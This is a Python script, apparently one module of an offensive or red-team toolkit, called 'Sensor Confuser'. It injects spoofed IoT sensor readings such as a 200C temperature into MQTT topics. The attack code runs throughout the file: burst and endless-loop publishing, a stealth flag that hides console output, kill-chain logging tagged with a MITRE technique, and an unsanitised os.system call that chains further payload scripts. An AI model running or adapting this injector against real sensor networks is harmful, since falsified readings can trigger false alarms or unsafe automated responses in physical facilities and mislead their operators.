import os
import json
import time
import argparse
import random
import paho.mqtt.publish as publish
from datetime import datetime

AGENT_ID = "sensor_confuser"
ALERT_FILE = "webgui/alerts.json"
LOG_FILE = "reports/sensor_confuser.log"
KILLCHAIN_FILE = "reports/killchain.json"
PAYLOAD_FILE = "reports/spoof_payloads.jsonl"
MITRE_TTP = "T1496"  # Resource Hijacking
DEFAULT_BROKER = "127.0.0.1"
MQTT_TOPIC_BASE = "iot/sensors/"

os.makedirs("webgui", exist_ok=True)
os.makedirs("reports", exist_ok=True)

# === Utilities ===
def log(msg, quiet=False):
    if not quiet:
        print(f"[SENSOR] {msg}")
    with open(LOG_FILE, "a") as f:
        f.write(f"{time.ctime()} | {msg}\n")

def push_alert(message):
    with open(ALERT_FILE, "a") as f:
        f.write(json.dumps({
            "agent": AGENT_ID,
            "alert": message,
            "type": "sensor",
            "timestamp": time.time()
        }) + "\n")

def update_killchain(sensor_type):
    entry = {
        "agent": AGENT_ID,
        "event": f"Sensor spoof injected: {sensor_type}",
        "technique": MITRE_TTP,
        "time": time.time()
    }
    with open(KILLCHAIN_FILE, "a") as f:
        f.write(json.dumps(entry) + "\n")

def detect_unit(sensor):
    sensor = sensor.lower()
    if "temp" in sensor:
        return "C"
    elif "gas" in sensor or "co2" in sensor:
        return "ppm"
    elif "humidity" in sensor:
        return "%"
    return "units"

def get_mqtt_broker():
    cfg_path = "config/config.yaml"
    if os.path.exists(cfg_path):
        try:
            import yaml
            with open(cfg_path) as f:
                cfg = yaml.safe_load(f)
                return cfg.get("mqtt_broker", DEFAULT_BROKER)
        except:
            pass
    return DEFAULT_BROKER

def publish_mqtt(sensor_type, spoof_value, stealth=False):
    unit = detect_unit(sensor_type)
    sensor_id = f"{sensor_type}_{random.randint(100, 999)}"
    topic = MQTT_TOPIC_BASE + sensor_type
    payload = {
        "sensor": sensor_type,
        "sensor_id": sensor_id,
        "unit": unit,
        "value": float(str(spoof_value).replace(unit, "").replace("ppm", "")),
        "spoofed": True,
        "timestamp": time.time()
    }
    try:
        publish.single(topic, payload=json.dumps(payload), hostname=get_mqtt_broker())
        log(f"Published to MQTT: {topic} -> {json.dumps(payload)}", stealth)
    except Exception as e:
        log(f"[!] MQTT publish failed: {e}", stealth)

    with open(PAYLOAD_FILE, "a") as f:
        f.write(json.dumps(payload) + "\n")

# === Injection logic ===
def inject_sensor_spoof(sensor_type, spoof_value, burst=1, loop=False, delay=3, stealth=False, chain=None):
    log(f"Injecting spoofed {sensor_type} = {spoof_value}", stealth)
    push_alert("Sensor spoof injection running")
    update_killchain(sensor_type)

    for _ in range(burst):
        publish_mqtt(sensor_type, spoof_value, stealth)
        time.sleep(0.5)

    if loop:
        log(f"Entering loop mode every {delay}s...", stealth)
        while True:
            publish_mqtt(sensor_type, spoof_value, stealth)
            time.sleep(delay)

    if chain:
        log(f"Chaining to payload: {chain}", stealth)
        os.system(f"python3 {chain}")

# === Entry ===
def main():
    parser = argparse.ArgumentParser(description="Sensor Confuser – MQTT spoof injector")
    parser.add_argument("--sensor", default="temperature", help="Sensor type (e.g. temperature, gas, humidity)")
    parser.add_argument("--value", default="200", help="Spoofed sensor value (e.g. 200C or 400ppm)")
    parser.add_argument("--burst", type=int, default=1, help="Immediate spoof message count")
    parser.add_argument("--loop", action="store_true", help="Loop continuously")
    parser.add_argument("--delay", type=int, default=3, help="Delay between loop injections (sec)")
    parser.add_argument("--stealth", action="store_true", help="Suppress console output")
    parser.add_argument("--chain", help="Optional chained script after injection")
    args = parser.parse_args()

    inject_sensor_spoof(
        sensor_type=args.sensor,
        spoof_value=args.value,
        burst=args.burst,
        loop=args.loop,
        delay=args.delay,
        stealth=args.stealth,
        chain=args.chain
    )

if __name__ == "__main__":
    main()
